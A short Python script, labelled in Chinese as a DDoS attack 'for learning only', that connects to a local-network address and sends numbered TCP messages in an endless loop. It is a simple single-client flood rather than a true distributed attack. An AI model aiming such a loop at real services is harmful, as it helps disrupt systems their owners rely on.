'''

免责声明：本代码纯学习用途
# DDos攻击
'''
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(
        ('192.168.137.1', 8888)
    )
count = 1

while True:
    # recv_message = client.recv(1024)
    # print(f'服务器发来的消息:{recv_message.decode("utf-8")}')

    send_message = f'第{count}条消息'
    client.send(send_message.encode('utf-8'))
    print(f'已发送消息：{send_message}')
    count += 1